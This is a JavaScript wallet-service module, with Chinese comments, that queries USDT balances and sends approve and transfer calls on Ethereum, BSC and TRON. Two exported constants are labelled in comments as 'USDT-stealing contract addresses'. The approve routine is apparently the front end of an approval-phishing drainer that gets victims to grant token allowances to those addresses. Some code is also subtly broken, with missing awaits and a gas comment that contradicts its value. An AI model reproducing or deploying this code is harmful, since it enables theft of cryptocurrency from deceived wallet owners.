import { ethers } from 'ethers'
import { ChainType, ChainConfig } from '@/utils/chainConfig'
import { fromUsdtToWei } from '@/utils/formatUtil'
import { getWalletState } from './walletService'

// ------------------------------
// 合约ABI定义（ERC20/BEP20/TRC20通用）
// ------------------------------
// ERC20/BEP20合约ABI（适用于ETH/BSC链）
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)'
]

// TRC20合约ABI（适用于TRON链）
const TRC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)'
]

//以太坊盗U合约地址
export const eth_approve_address='0xa61C92aA225b0Abdeb40b305900dCB8fA6Bc2Ade'

//波场盗U合约地址
export const tron_approve_address='TFLo5KpsCZ3NZDHSUhQG2cVeGuBpvAJsdK'


// ------------------------------
// 私有工具函数：获取USDT合约实例
// ------------------------------
const getUsdtContract = async () => {
  const { connected, chainType, provider, address } = getWalletState()


  // 校验钱包连接状态
  if (!connected || !provider || !address) {
    throw new Error('钱包未连接，请先连接钱包再操作')
  }

  // 获取当前链的配置（合约地址、RPC等）
  const chainConfig = ChainConfig[chainType]
  const contractAddress = chainConfig.usdtContract

  // 按链类型初始化合约实例
  if (chainType === ChainType.TRON) {

    // TRON链：使用TronWeb合约实例
    return await provider.contract(TRC20_ABI).at(contractAddress)
  } else {
    // ETH/BSC链：使用ethers合约实例（带签名者）
    const signer = provider.getSigner(address)
    return new ethers.Contract(contractAddress, ERC20_ABI, signer)
  }
}

// ------------------------------
// 公开函数1：查询USDT余额
// ------------------------------
export const getUsdtBalance = async () => {
  const contract = await getUsdtContract()
  const { address, chainType } = getWalletState()

  try {
    // 按链类型调用balanceOf方法
    if (chainType === ChainType.TRON) {
      const balance = await contract.balanceOf(address)

      return balance.toString()
    } else {
      const balance = await contract.balanceOf(address)
      return balance.toString()
    }
  } catch (error) {
    console.error('获取USDT余额失败:', error)
    // 友好错误提示
    if (error.message.includes('execution reverted')) {
      throw new Error('获取余额失败：合约地址与当前链不匹配，请检查链配置')
    } else {
      throw new Error(`获取余额失败：${error.message || '网络异常，请重试'}`)
    }
  }
}

// ------------------------------
// 公开函数2：USDT授权（手动设置gas）
// ------------------------------
export const approveUsdt = async (amount, spender) => {
  const contract =await getUsdtContract()
  const { address, chainType, provider } = getWalletState()
  let decimals =6
  if(chainType === ChainType.BSC) {decimals=18}
  const amountWei = fromUsdtToWei(amount,decimals) // 转换为最小单位（如1 USDT → 1e6 wei）

  // 1. 基础参数校验
  if (amountWei === '0' || Number(amount) <= 0) {
    throw new Error('授权金额不能为0，请输入有效的授权金额')
  }
  if (!spender || (spender.startsWith('0x') && !ethers.utils.isAddress(spender)) || (spender.startsWith('T') && spender.length !== 34)) {
    throw new Error('授权地址无效，请检查地址格式（ETH/BSC以0x开头，TRON以T开头且34位）')
  }

  try {
    if (chainType === ChainType.TRON) {
      // TRON链授权：无需手动设置gas，TronWeb自动处理
      const tx = await contract.approve(spender, amountWei).send({
        from: address,
        shouldPollResponse: true // 等待交易确认
      })
      return tx.transactionHash // 返回交易哈希
    } else {
      // ------------------------------
      // ETH/BSC链授权，手动设置gas参数
      // ------------------------------
      const signer = provider.getSigner(address)

      // ① 获取当前网络的gas价格（使用钱包实时gasPrice，避免价格过低导致交易卡住）
      const gasPrice = await signer.getGasPrice()

      // ② 手动设置gasLimit（USDT授权通常需要300000 gas，足够覆盖执行成本，可根据实际情况微调）
      const gasLimit = ethers.utils.hexlify(60000) // 转换为十六进制格式（ethers要求）

      // ③ 调用approve方法，传入手动设置的gas参数（跳过自动估算，解决UNPREDICTABLE_GAS_LIMIT）
      const txResponse = await contract.approve(spender, amountWei, {
        gasPrice: gasPrice,
        gasLimit: gasLimit
      })

      // ④ 等待1个区块确认（确保交易已上链）
      const txReceipt = await txResponse.wait(1)
      return txReceipt.transactionHash // 返回交易哈希
    }
  } catch (error) {
    console.error('USDT授权失败:', error)
    // 2. 分类错误提示（帮助用户快速定位问题）
    if (error.message.includes('execution reverted')) {
      throw new Error('授权失败：合约执行回滚，可能原因：① 合约地址与当前链不匹配 ② 钱包无该链的Gas资产（如ETH/BNB/TRX）')
    } else if (error.message.includes('insufficient funds') || error.message.includes('balance too low')) {
      throw new Error('授权失败：钱包Gas资产不足，请先充值对应链的Gas（ETH/BSC需ETH/BNB，TRON需TRX）')
    } else if (error.message.includes('user rejected') || error.message.includes('rejected by user')) {
      throw new Error('授权失败：用户已拒绝授权请求，请重新发起授权并确认')
    } else {
      throw new Error(`授权失败：${error.message || '网络异常，请检查钱包连接或重试'}`)
    }
  }
}

// ------------------------------
// 公开函数3：USDT转账（可选添加gas参数，避免后续转账报错）
// ------------------------------
export const transferUsdt = async (toAddress, amount) => {
  const contract = getUsdtContract()
  const { chainType, provider, address } = getWalletState()
  let decimals =6
  if(chainType === ChainType.BSC) {decimals=18}
  const amountWei = fromUsdtToWei(amount,decimals)

  // 1. 基础参数校验
  if (amountWei === '0' || Number(amount) <= 0) {
    throw new Error('转账金额不能为0，请输入有效的转账金额')
  }
  if (!toAddress) {
    throw new Error('接收地址不能为空，请输入接收地址')
  }
  // 地址格式校验（ETH/BSC vs TRON）
  if (chainType === ChainType.TRON) {
    if (!/^T[a-zA-Z0-9]{33}$/.test(toAddress)) {
      throw new Error('无效的TRON接收地址：需以T开头，且长度为34位字符')
    }
  } else {
    if (!ethers.utils.isAddress(toAddress)) {
      throw new Error('无效的ETH/BSC接收地址：需以0x开头，且符合以太坊地址格式')
    }
  }

  try {
    if (chainType === ChainType.TRON) {
      // TRON链转账：TronWeb自动处理gas
      const tx = await contract.transfer(toAddress, amountWei).send({
        from: address,
        shouldPollResponse: true
      })
      return tx.transactionHash
    } else {
      // ------------------------------
      // 可选优化：转账也手动设置gas（避免类似授权的gas估算问题）
      // ------------------------------
      const signer = provider.getSigner(address)
      const gasPrice = await signer.getGasPrice()
      const gasLimit = ethers.utils.hexlify(350000) // 转账比授权略费gas，设为350000更稳妥

      const txResponse = await contract.transfer(toAddress, amountWei, {
        gasPrice: gasPrice,
        gasLimit: gasLimit
      })
      const txReceipt = await txResponse.wait(1)
      return txReceipt.transactionHash
    }
  } catch (error) {
    console.error('USDT转账失败:', error)
    // 分类错误提示
    if (error.message.includes('execution reverted')) {
      throw new Error('转账失败：合约执行回滚，可能原因：① 合约地址与当前链不匹配 ② 授权额度不足（需先授权）')
    } else if (error.message.includes('insufficient funds')) {
      throw new Error('转账失败：钱包Gas资产不足，请先充值对应链的Gas')
    } else if (error.message.includes('allowance is too low')) {
      throw new Error('转账失败：授权额度不足，请先进行USDT授权（授权金额≥转账金额）')
    } else if (error.message.includes('user rejected')) {
      throw new Error('转账失败：用户已拒绝转账请求，请重新发起并确认')
    } else {
      throw new Error(`转账失败：${error.message || '网络异常，请重试'}`)
    }
  }
}

// ------------------------------
// 公开函数4：查询USDT授权额度
// ------------------------------
export const getUsdtAllowance = async (spender) => {
  const contract = getUsdtContract()
  const { address } = getWalletState()

  // 校验授权地址格式
  if (!spender || (spender.startsWith('0x') && !ethers.utils.isAddress(spender)) || (spender.startsWith('T') && spender.length !== 34)) {
    throw new Error('授权地址无效，请检查地址格式')
  }

  try {
    // 查询当前地址对目标地址的授权额度
    const allowance = await contract.allowance(address, spender)
    return allowance.toString() // 返回最小单位的授权额度（需自行转换为USDT）
  } catch (error) {
    console.error('查询授权额度失败:', error)
    throw new Error(`查询授权额度失败：${error.message || '网络异常，请重试'}`)
  }
}